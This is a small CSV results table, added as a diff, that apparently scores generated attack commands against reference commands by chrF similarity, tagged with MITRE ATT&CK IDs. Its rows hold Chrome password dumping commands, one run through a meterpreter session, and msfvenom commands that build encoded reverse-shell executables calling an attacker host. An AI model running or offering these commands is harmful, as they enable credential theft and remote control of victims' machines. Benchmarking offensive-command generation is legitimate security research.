@@ -1,0 +1,5 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_chrome_passwords_TA0011_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",64.495,True
+command_chrome_passwords_TA0011_T1056.txt,chrome passwords,chrome-passwords -p > output.txt,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",46.422,True
+command_chrome_passwords_TA0011_T1056.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",59.855,True
+command_metasploit_TA0001_T1190.txt,metasploit,msfvenom -p windows/x86/shell_reverse_tcp LHOST=192.168.1.123 LPORT=4444 -e x86/shikata_ga_nai -f exe > payload.exe,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,38.36,True
